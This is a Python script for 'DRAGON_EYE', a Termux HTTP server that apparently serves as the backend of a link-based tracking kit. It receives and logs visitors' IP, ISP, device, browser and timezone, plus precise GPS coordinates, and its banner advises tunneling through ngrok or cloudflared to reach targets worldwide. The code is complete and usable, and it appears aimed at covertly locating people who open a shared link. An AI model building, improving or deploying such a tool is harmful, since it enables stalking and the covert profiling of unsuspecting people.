# Code made by Webdragon63
# UI improvements by ChatGPT
"""
═══════════════════════════════════════════════════════════════════════════
     🌍 Modern Geolocation & Client Data Server  |  Threaded HTTP API
═══════════════════════════════════════════════════════════════════════════
Logs client data (browser, platform, device) and geolocation.
───────────────────────────────────────────────────────────────────────────
"""

import os
import sys
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from datetime import datetime
from time import sleep


# ╔══════════════════════════════════════════════════════════════╗
# ║                         CONFIGURATION                        ║
# ╚══════════════════════════════════════════════════════════════╝
HOST = '0.0.0.0'
PORT = 8000
LOG_DIR = "logs"


# ╔══════════════════════════════════════════════════════════════╗
# ║                     TERMINAL COLOR CODES                     ║
# ╚══════════════════════════════════════════════════════════════╝
class C:
    END = "\033[0m"
    BOLD = "\033[1m"
    GRAY = "\033[90m"
    CYAN = "\033[36m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"


# ╔══════════════════════════════════════════════════════════════╗
# ║                          UTILITIES                           ║
# ╚══════════════════════════════════════════════════════════════╝
def ensure_directories():
    """Ensure required directories exist."""
    os.makedirs(LOG_DIR, exist_ok=True)


def print_header():
    """Print a clean modern header banner."""
    os.system('cls' if os.name == 'nt' else 'clear')
    title = "DRAGON_EYE | Termux version"
    print(f"{C.CYAN}{'═' * 70}{C.END}")
    print(f"{C.BOLD}{title.center(70)}{C.END}")
    print(f"{C.CYAN}{'═' * 70}{C.END}")
    print(f"{C.GRAY}[*] Listening on: {C.CYAN}http://localhost:{PORT}{C.END}")
    print(f"{C.GRAY}[*] Logs saved in: {C.CYAN}{LOG_DIR}/{C.END}")
    print(f"{C.GRAY}[*] Press Ctrl+C to stop.{C.END}\n")


def animate_spinner(text="Starting Server"):
    """Simple built-in spinner animation."""
    spinner = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for frame in spinner * 2:
        sys.stdout.write(f"\r{C.CYAN}{frame} {text}...{C.END}")
        sys.stdout.flush()
        sleep(0.08)
    print("\r", end="")


# ╔══════════════════════════════════════════════════════════════╗
# ║                      SERVER IMPLEMENTATION                   ║
# ╚══════════════════════════════════════════════════════════════╝
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    allow_reuse_address = True


class ModernHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *_):
        pass  # silence default log

    def _client_ip(self):
        if "X-Forwarded-For" in self.headers:
            return self.headers["X-Forwarded-For"].split(",")[0].strip()
        elif "X-Real-IP" in self.headers:
            return self.headers["X-Real-IP"]
        return self.client_address[0]

    def _send_headers(self, code, content_type, length=None):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Connection", "keep-alive")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        if length:
            self.send_header("Content-Length", str(length))
        self.end_headers()

    # ─────────────────────────────────────────────
    # OPTIONS
    # ─────────────────────────────────────────────
    def do_OPTIONS(self):
        self._send_headers(200, "text/plain")

    # ─────────────────────────────────────────────
    # GET
    # ─────────────────────────────────────────────
    def do_GET(self):
        try:
            if self.path in ("/", "/index.html"):
                if os.path.exists("index.html"):
                    with open("index.html", "rb") as f:
                        content = f.read()
                    self._send_headers(200, "text/html", len(content))
                    self.wfile.write(content)
                else:
                    self._send_headers(404, "text/plain")
                    self.wfile.write(b"index.html not found")
            else:
                msg = b"Server is online"
                self._send_headers(200, "text/plain", len(msg))
                self.wfile.write(msg)
        except (BrokenPipeError, ConnectionResetError):
            pass

    # ─────────────────────────────────────────────
    # POST
    # ─────────────────────────────────────────────
    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length)
            if self.path == "/client-data":
                self._handle_client_data(raw)
            elif self.path == "/location":
                self._handle_location_data(raw)
            else:
                self._send_headers(404, "text/plain")
                self.wfile.write(b"Not found")
        except (BrokenPipeError, ConnectionResetError):
            pass

    # ─────────────────────────────────────────────
    # HANDLERS
    # ─────────────────────────────────────────────
    def _handle_client_data(self, raw):
        try:
            data = json.loads(raw.decode())
            ip = self._client_ip()

            log_entry = {
                "ip": data.get("ip"),
                "isp": data.get("isp"),
                "userAgent": data.get("userAgent"),
                "device": data.get("device"),
                "browser": data.get("browser"),
                "language": data.get("language"),
                "platform": data.get("platform"),
                "country": data.get("country"),
                "screenResolution": data.get("screenResolution"),
                "resolution": data.get("screenResolution"),
                "timezone": data.get("timezone"),
            }

            print(f"\n{C.GREEN}[✓] Client Data from {C.YELLOW}{ip}{C.END}")
            for k, v in log_entry.items():
                if k not in ("ip", "timestamp"):
                    print(f"   {C.GRAY}{k.capitalize():<12}{C.END}: {v}")

            with open(os.path.join(LOG_DIR, "client_data.json"), "a") as f:
                f.write(json.dumps(log_entry) + "\n")

            resp = b"Client data received"
            self._send_headers(200, "text/plain", len(resp))
            self.wfile.write(resp)

        except Exception as e:
            err = f"Client data error: {e}".encode()
            self._send_headers(400, "text/plain", len(err))
            self.wfile.write(err)

    def _handle_location_data(self, raw):
        try:
            data = json.loads(raw.decode())
            ip = self._client_ip()

            geo_entry = {
                "ip": data.get("ip"),
                "timestamp": data.get("timestamp"),
                "latitude": data.get("latitude"),
                "longitude": data.get("longitude"),
                "accuracy": data.get("accuracy"),
            }

            print(f"\n{C.MAGENTA}[📍] Location Logged from {C.YELLOW}{ip}{C.END}")
            print(f"   {C.GRAY}Lat:{C.END} {geo_entry['latitude']}  "
                  f"{C.GRAY}Lon:{C.END} {geo_entry['longitude']}  "
                  f"{C.GRAY}±{C.END}{geo_entry['accuracy']}m")

            with open(os.path.join(LOG_DIR, "location_data.json"), "a") as f:
                f.write(json.dumps(geo_entry) + "\n")

            resp = b'{"status": "OK"}'
            self._send_headers(200, "application/json", len(resp))
            self.wfile.write(resp)

        except Exception as e:
            err = f"Geolocation error: {e}".encode()
            self._send_headers(500, "application/json", len(err))
            self.wfile.write(err)


# ╔══════════════════════════════════════════════════════════════╗
# ║                          MAIN ENTRY                          ║
# ╚══════════════════════════════════════════════════════════════╝
if __name__ == "__main__":
    ensure_directories()
    print_header()
    animate_spinner("Launching")

    try:
        server = ThreadedHTTPServer((HOST, PORT), ModernHandler)
        print(f"{C.GREEN}\n{C.MAGENTA}[+] To use it worldwide, just tunnel port {PORT} with any http tunneling software.{C.END}")
        print(f"{C.GRAY}[+]  Ex: ngrok, telebit, cloudflared, etc.{C.END}")
        print(f"{C.GREEN}\n[+] Server ready and listening on http://{HOST}:{PORT}{C.END}")
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[*] Server stopped by user.{C.END}")
    except Exception as e:
        print(f"{C.RED}[!] Server error: {e}{C.END}")

